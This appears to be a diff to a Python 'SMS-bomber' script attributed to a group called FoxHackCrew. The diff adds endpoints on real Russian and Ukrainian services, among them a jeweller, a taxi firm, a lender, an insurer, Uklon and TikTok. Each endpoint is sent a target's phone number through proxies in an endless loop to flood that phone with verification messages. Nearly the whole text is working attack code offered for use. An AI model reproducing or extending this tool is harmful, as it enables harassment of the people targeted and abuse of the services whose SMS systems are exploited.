@@ -1,4 +1,4 @@
-# -*- coding: utf-8 -*-
+# -*- coding: utf-8 -*- by FoxHackCrew Telegram: @fox29a
 import requests, random, datetime, sys, time, argparse, os
 from colorama import Fore, Back, Style
 import ctypes
@@ -7,14 +7,13 @@ import colorama
 banner1 = """
 ╔═══════════════════════════════════════════════════════╗
 ║  ███████ ███████ ████  ██ ███████ ███████ ██ ███████  ║ 
-║  ██      ██      ██ ██ ██ ██      ██      ██ ██V:1.0.0║
+║  ██      ██      ██ ██ ██ ██      ██      ██ ██V:1.0.1║
 ║  ██  ███ ███████ ██  ████ ███████ ███████ ██ ███████  ║
 ║  ██   ██ ██      ██   ███ ██           ██ ██      ██  ║
 ║  ███████ ███████ ██    ██ ███████ ███████ ██ ███████  ║
 ╚════╗                                            ╔═════╝
      ║###FoxHackCrew###SMS-BOMBER###FoxHackCrew###║
      ╚════════════════════════════════════════════╝
-
 """
 
 print(Fore.CYAN + banner1)
@@ -328,3 +327,41 @@ while True:
 		print(Fore.RED + '[+] Apteka366 отправлено!')
 	except:
 		print(Fore.RED + '[-] Не отправлено!')
+
+	try:
+		requests.post('https://zoloto585.ru/api/bcard/reg/', json={"name":"","surname":"","patronymic":"","sex":"m","birthdate":"..","phone":phonee,"email":"","city":""}, proxies=proxies, timeout=10)
+		print(Fore.RED + '[+] Zoloto585 отправлено!')
+	except:
+		print(Fore.RED + '[-] Не отправлено!')
+
+	try:
+		requests.post('https://3040.com.ua/taxi-ordering', data={"callback-phone": phone}, proxies=proxies, timeout=10)
+		print(Fore.RED + '[+] 3040 отправлено!')
+	except:
+		print(Fore.RED + '[-] Не отправлено!')		
+
+	try:
+		requests.post('https://ng-api.webbankir.com/user/v2/create', json={"lastName":"иванов","firstName":"иван","middleName":"иванович","mobilePhone":phone,"email":email,"smsCode":""}, proxies=proxies, timeout=10)
+		print(Fore.RED + '[+] WebBankir отправлено!')
+	except:
+		print(Fore.RED + '[-] Не отправлено!')
+
+	try:
+		requests.post('https://shop.vsk.ru/ajax/auth/postSms/', data={"phone": phone}, proxies=proxies, timeout=10)
+		print(Fore.RED + '[+] ShopVSK отправлено!')
+	except:
+		print(Fore.RED + '[-] Не отправлено!')
+
+	try:
+		requests.post('https://uklon.com.ua/api/v1/account/code/send', headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},json={"phone": phone}, proxies=proxies, timeout=10)
+		print(Fore.RED + '[+] Uklon отправлено!')
+	except:
+		print(Fore.RED + '[-] Не отправлено!')
+
+	try:
+		requests.post('https://m.tiktok.com/node-a/send/download_link', json={"slideVerify":0,"language":"ru","PhoneRegionCode":"7","Mobile":phone9,"page":{"pageName":"home","launchMode":"direct","trafficType":""}}, proxies=proxies, timeout=10)
+		print(Fore.RED + '[+] TikTok отправлено!')
+	except:
+		print(Fore.RED + '[-] Не отправлено!')
+
+	
